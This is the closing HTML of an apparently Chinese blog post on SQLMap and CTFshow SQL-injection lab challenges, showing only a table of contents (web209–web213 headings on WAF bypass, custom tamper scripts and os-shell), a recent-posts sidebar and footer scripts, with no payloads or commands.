toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-4"><span class="toc-number">13.4.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web209"><span class="toc-number">14.</span> <span class="toc-text">Web209</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA-7"><span class="toc-number">14.1.</span> <span class="toc-text">提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-8"><span class="toc-number">14.2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF"><span class="toc-number">14.2.1.</span> <span class="toc-text">WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE-tamper-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%A1%8C%EF%BC%88%E5%AE%9E%E6%B5%8B%E4%B8%A4%E8%BD%AE%E5%A4%B1%E8%B4%A5%EF%BC%89%EF%BC%9A"><span class="toc-number">14.2.2.</span> <span class="toc-text">内置 tamper 为什么不行（实测两轮失败）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%86%99-tamper"><span class="toc-number">14.2.3.</span> <span class="toc-text">自写 tamper</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-8"><span class="toc-number">14.3.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-5"><span class="toc-number">14.4.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web210"><span class="toc-number">15.</span> <span class="toc-text">Web210</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA-8"><span class="toc-number">15.1.</span> <span class="toc-text">提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-9"><span class="toc-number">15.2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E9%93%BE%E4%B8%8E%E9%80%86%E8%BF%90%E7%AE%97"><span class="toc-number">15.2.1.</span> <span class="toc-text">加密链与逆运算</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%86%99-tamper%EF%BC%88-home-d-tools-tamper-ctfshow210-py%EF%BC%89"><span class="toc-number">15.2.2.</span> <span class="toc-text">自写 tamper（&#x2F;home&#x2F;d&#x2F;tools&#x2F;tamper&#x2F;ctfshow210.py）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-9"><span class="toc-number">15.3.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-6"><span class="toc-number">15.4.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web211"><span class="toc-number">16.</span> <span class="toc-text">Web211</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA-9"><span class="toc-number">16.1.</span> <span class="toc-text">提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-10"><span class="toc-number">16.2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%AF%B9%E4%B8%8A%E9%A2%98%E5%A4%9A%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9A"><span class="toc-number">16.2.1.</span> <span class="toc-text">相对上题多了什么：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%86%99-tamper%EF%BC%88-home-d-tools-tamper-ctfshow211-py%EF%BC%89"><span class="toc-number">16.2.2.</span> <span class="toc-text">自写 tamper（&#x2F;home&#x2F;d&#x2F;tools&#x2F;tamper&#x2F;ctfshow211.py）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-10"><span class="toc-number">16.3.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-7"><span class="toc-number">16.4.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web212"><span class="toc-number">17.</span> <span class="toc-text">Web212</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA-10"><span class="toc-number">17.1.</span> <span class="toc-text">提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-11"><span class="toc-number">17.2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%92%8C-web211-%E7%9A%84%E5%B7%AE%E5%88%AB"><span class="toc-number">17.2.1.</span> <span class="toc-text">和 web211 的差别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-11"><span class="toc-number">17.3.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-8"><span class="toc-number">17.4.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web213"><span class="toc-number">18.</span> <span class="toc-text">Web213</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA-11"><span class="toc-number">18.1.</span> <span class="toc-text">提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-12"><span class="toc-number">18.2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E9%93%BE"><span class="toc-number">18.2.1.</span> <span class="toc-text">执行链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-12"><span class="toc-number">18.3.</span> <span class="toc-text">测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E7%A1%AE%E8%AE%A4-DBA%EF%BC%9A"><span class="toc-number">18.3.1.</span> <span class="toc-text">先确认 DBA：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E4%BA%A4%E4%BA%92%E5%BC%8F-os-shell%EF%BC%88%E7%AE%A1%E9%81%93%E5%96%82%E5%91%BD%E4%BB%A4%EF%BC%89"><span class="toc-number">18.3.2.</span> <span class="toc-text">方法1：交互式 os-shell（管道喂命令）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E9%9D%9E%E4%BA%A4%E4%BA%92%E5%BC%8F%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">18.3.3.</span> <span class="toc-text">方法2：非交互式执行命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A4%E4%B8%AA%E6%96%B9%E6%B3%95%E5%8C%BA%E5%88%AB"><span class="toc-number">18.4.</span> <span class="toc-text">两个方法区别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%BA%E5%88%AB%E5%8F%AA%E5%9C%A8%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">18.4.1.</span> <span class="toc-text">区别只在交互方式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E5%87%86%E7%A1%AE%E8%AF%B4%E6%B3%95%E6%98%AF%EF%BC%9A"><span class="toc-number">18.4.2.</span> <span class="toc-text">所以准确说法是：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-9"><span class="toc-number">18.5.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">19.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/sqlmap/" title="SQLMap使用总结及CTFshow靶场所有题目详细分析">SQLMap使用总结及CTFshow靶场所有题目详细分析</a><time datetime="2026-11-18T04:48:27.672Z" title="发表于 2026-11-18 12:48:27">2026-11-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/nmap/" title="Nmap详细使用总结及CTFShow-web859内网渗透测试">Nmap详细使用总结及CTFShow-web859内网渗透测试</a><time datetime="2026-11-16T16:37:37.541Z" title="发表于 2026-11-17 00:37:37">2026-11-17</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2024 - 2026 By Teaaa</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.1.260810</a></span></div><div class="footer_custom_text">navy~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.1.260810"></script><script src="/js/main.js?v=5.7.1.260810"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="220,100,40" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.7.1.260810"></script></div></div></body></html>
